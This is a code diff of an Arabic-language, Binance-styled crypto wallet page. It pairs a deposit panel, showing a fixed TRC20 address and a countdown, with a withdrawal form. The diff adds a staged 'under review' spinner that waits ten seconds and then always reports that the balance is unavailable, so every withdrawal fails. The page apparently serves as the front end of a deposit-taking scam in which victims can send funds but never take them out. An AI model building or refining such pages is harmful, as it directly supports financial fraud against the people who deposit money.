@@ -7,32 +7,27 @@
   <link rel="stylesheet" href="home.css">
   <link rel="stylesheet" href="https://cloudflare.com">
   <style>
-    /* التنسيق الجديد لكارت الرصيد الاحترافي الداكن */
+    /* كارت الرصيد الداكن */
     .balance-card {
-      background-color: #181a20 !important; /* خلفية داكنة */
+      background-color: #181a20 !important;
       border-radius: 12px;
       padding: 20px;
       margin-bottom: 20px;
-      text-align: right; /* محاذاة النص لليمين مثل الصورة */
-      box-shadow: none !important;
+      text-align: right;
       border: 1px solid #2b3139;
     }
     .balance-label {
-      color: #848e9c !important; /* لون رمادي خفيف للعنوان */
+      color: #848e9c !important;
       font-size: 14px;
       display: flex;
       align-items: center;
       gap: 5px;
     }
-    .balance-label i {
-      font-size: 11px;
-    }
     .balance-amount {
-      color: #ffffff !important; /* لون الرقم أبيض */
+      color: #ffffff !important;
       font-size: 32px;
       font-weight: bold;
       margin: 10px 0 5px 0 !important;
-      font-family: Arial, sans-serif;
     }
     .balance-stats {
       display: flex;
@@ -42,8 +37,7 @@
       margin-bottom: 15px;
     }
     .stat-green {
-      color: #0ecb81; /* اللون الأخضر للأرباح */
-      font-weight: 500;
+      color: #0ecb81;
     }
     .stat-badge {
       background-color: #2b3139;
@@ -54,21 +48,16 @@
     }
     .deposit-trigger-btn {
       width: 100%;
-      background-color: #0066ee !important; /* زر أزرق مريح للاستخدام */
+      background-color: #0066ee !important;
       color: white !important;
       border: none;
       padding: 12px;
       border-radius: 8px;
       font-weight: bold;
       cursor: pointer;
-      font-size: 15px;
-      transition: background 0.2s;
-    }
-    .deposit-trigger-btn:hover {
-      background-color: #0052cc !important;
     }
 
-    /* تعديل شريط اللودينغ والخط إلى اللون الأزرق الاحترافي */
+    /* شريط لودينج الإيداع الأزرق التنازلي السفلي */
     .deposit-loading-bar {
       width: 100%;
       background-color: #2b3139;
@@ -79,65 +68,129 @@
     }
     .loading-progress {
       width: 100%;
-      background-color: #0066ee !important; /* لودينغ باللون الأزرق */
+      background-color: #0066ee !important;
       height: 100%;
-      animation: countdownProgress 2700s linear forwards; /* 45 دقيقة */
+      animation: countdownProgress 2700s linear forwards;
     }
     @keyframes countdownProgress {
       from { width: 100%; }
       to { width: 0%; }
     }
-    .countdown-timer-box {
-      color: #0066ee !important; /* نص وقت طلب الدفع باللون الأزرق */
-      font-weight: bold;
-      text-align: center;
-      margin-top: 10px;
+
+    /* حاوية العداد التنازلي المحدثة بالدائرة التي تدور */
+    .countdown-timer-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-top: 15px;
     }
-    #timer {
-      color: #0066ee !important; /* أرقام العداد باللون الأزرق */
+    .payment-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(0, 102, 238, 0.2);
+      border-top: 2px solid #0066ee;
+      border-radius: 50%;
+      animation: spinTimer 1.5s linear infinite;
+    }
+    @keyframes spinTimer {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .countdown-timer-box {
+      color: #0066ee !important;
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    /* تعديل لون زر السحب إلى الأخضر */
+    .withdraw-submit-btn {
+      background-color: #0ecb81 !important; 
+      color: white !important;
+      width: 100%;
+      padding: 14px;
+      border-radius: 8px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    /* شاشة اللودينج الدائرية المنبثقة الخضراء للسحب (تنتظر 10 ثوانٍ) */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(18, 22, 26, 0.9);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .spinner-circle {
+      width: 70px;
+      height: 70px;
+      border: 6px solid #eef1f4;
+      border-top: 6px solid #0ecb81; /* النصف الأخضر مثل صورتك تماماً */
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: bold;
+      font-family: Arial, sans-serif;
     }
   </style>
 </head>
 <body>
 
+<!-- شاشة الانتظار المخصصة لعملية السحب (تظهر لمدة 10 ثوانٍ) -->
+<div id="loadingOverlay" class="loading-overlay">
+  <div class="spinner-circle"></div>
+  <div class="loading-text">جاري المراجعه يرجى الانتظار...</div>
+</div>
+
 <div class="withdraw-page-container">
-  <!-- بطاقة الرصيد الداكنة الاحترافية الجديدة -->
+  <!-- بطاقة الرصيد الداكنة -->
   <div class="balance-card">
     <div class="balance-label">
       Assets, total <i class="fas fa-chevron-up" style="font-size:8px;"></i><i class="fas fa-chevron-down" style="font-size:8px; margin-right:-3px;"></i>
     </div>
     <h2 class="balance-amount">0.00 USDT</h2>
-    
-    <!-- إحصائيات اليوم باللون الأخضر مثل صورتك -->
     <div class="balance-stats">
       <span class="stat-green">+0.00 · 0.00%</span>
       <span class="stat-badge">for today</span>
     </div>
-    
-    <!-- زر شحن الحساب -->
     <button type="button" class="deposit-trigger-btn" onclick="openDepositSection()">
       <i class="fas fa-wallet"></i> شحن الحساب
     </button>
   </div>
 
-  <!-- واجهة الدفع والشحن المحدثة باللون الأزرق -->
+  <!-- واجهة الدفع والشحن -->
   <div id="depositSection" class="deposit-container" style="display: none;">
     <div class="deposit-header">
       <h3>عملية الدفع TRC20</h3>
       <p>يمكنك الشحن من خارج منصات التداول عبر OKX أو Binance</p>
     </div>
     
-    <!-- شريط تحميل اللودينغ التنازلي الأزرق -->
-    <div class="deposit-loading-bar">
-      <div class="loading-progress"></div>
+    <div class="deposit-loading-bar"><div class="loading-progress"></div></div>
+    
+    <div class="countdown-timer-container">
+      <div class="payment-spinner"></div>
+      <div class="countdown-timer-box">
+        ينتهي طلب الدفع خلال: <span id="timer">45:00</span>
+      </div>
     </div>
 
-    <!-- العداد التنازلي الأزرق -->
-    <div class="countdown-timer-box">
-      <i class="far fa-clock"></i> ينتهي طلب الدفع خلال: <span id="timer">45:00</span>
-    </div>
-
-    <!-- عنوان المحفظة كامل وبدون تقطيع -->
     <div class="address-display-box">
       <span class="address-title">عنوان المحفظة (TRC20):</span>
       <div class="crypto-address" id="walletAddrText">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
@@ -145,12 +198,14 @@
     </div>
   </div>
 
-  <!-- نموذج طلب السحب -->
+  <!-- نموذج طلب السحب المحدث بكافة التعديلات اللغوية والنصية -->
   <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
     <div class="form-group">
-      <label class="group-label">الشبكة</label>
+      <label class="group-label">Network</label> 
       <select class="styled-input" id="networkSelect" required>
-        <option value="TRC20">TRC20</option>
+        <option value="TRC20">TRON (TRC20)</option>
+        <option value="ERC20">Ethereum (ERC20)</option>
+        <option value="BEP20">BNB Chain (BEP20)</option>
       </select>
     </div>
 
@@ -160,20 +215,20 @@
     </div>
 
     <div class="form-group">
-      <label class="group-label">كلمة مرور الصندوق</label>
+      <label class="group-label">كلــمه المــرور</label> 
       <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
     </div>
 
-    <!-- رسالة الخطأ -->
-    <div id="errorMessage" class="error-toast-message">
-      <i class="fas fa-exclamation-circle"></i> عذراً، رصيدك الحالي غير كافٍ لإتمام عملية السحب.
+    <!-- رسالة الخطأ النهائية المحدثة بنصك الخاص -->
+    <div id="errorMessage" class="error-toast-message" style="display:none; color:#f23645; gap:8px; align-items:center; margin-top:15px;">
+      <i class="fas fa-exclamation-circle"></i> فشل رصيدك غير متاح
     </div>
 
     <button type="button" onclick="handleWithdraw()" class="withdraw-submit-btn">سحب الأموال</button>
   </form>
 </div>
 
-<!-- شريط التنقل السفلي الاحترافي على طريقة بايننس -->
+<!-- شريط التنقل السفلي الاحترافي المحمي من الأعطال والمطابق لهوية موقعك -->
 <div class="binance-bottom-nav">
   <a href="account.html" class="binance-nav-item">
     <i class="fas fa-user"></i>
@@ -227,19 +282,27 @@ function copyAddress() {
   });
 }
 
+// دالة السحب الذكية مع لودينج أخضر يدور 10 ثوانٍ متبوعاً برسالة الفشل
 function handleWithdraw() {
   const address = document.getElementById('walletAddress').value.trim();
   const password = document.getElementById('fundPassword').value.trim();
   const errorDiv = document.getElementById('errorMessage');
+  const loader = document.getElementById('loadingOverlay');
 
   if (address === "" || password === "") {
       alert("يرجى ملء جميع الحقول المطلوبة أولاً.");
       return;
   }
-  errorDiv.style.display = 'flex';
+
+  // إظهار اللودينج الدائري الأخضر وإخفاء رسالة الخطأ السابقة
+  loader.style.display = 'flex';
+  errorDiv.style.display = 'none';
+
+  // تنفيذ الانتظار الفعلي لمدة 10 ثوانٍ (10000 مللي ثانية)
   setTimeout(() => {
-      errorDiv.style.display = 'none';
-  }, 5000);
+      loader.style.display = 'none'; // إخفاء اللودينج
+      errorDiv.style.display = 'flex'; // إظهار رسالة الفشل المكتوبة
+  }, 10000);
 }
 </script>
 
